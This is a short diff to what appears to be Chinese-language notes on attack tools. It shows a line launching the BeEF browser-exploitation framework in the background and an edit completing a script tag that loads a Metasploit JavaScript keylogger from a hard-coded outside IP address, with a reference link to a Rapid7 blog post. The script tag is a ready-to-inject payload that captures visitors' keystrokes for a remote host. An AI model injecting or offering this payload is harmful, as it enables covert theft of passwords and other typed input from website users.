@@ -35,7 +35,7 @@ nohup /usr/share/beef-xss/beef &
 
 # msf的keylogger的地址
 ```javascript
-<script type="text/javascript" src="http://139.162.69.124:8080/[ReplaceThis]/[whatever].js">
+<script type="text/javascript" src="http://139.162.69.124:8080/[ReplaceThis]/[whatever].js"></script>
 ```
 具体可以参考网址
 https://community.rapid7.com/community/metasploit/blog/2012/02/21/metasploit-javascript-keylogger
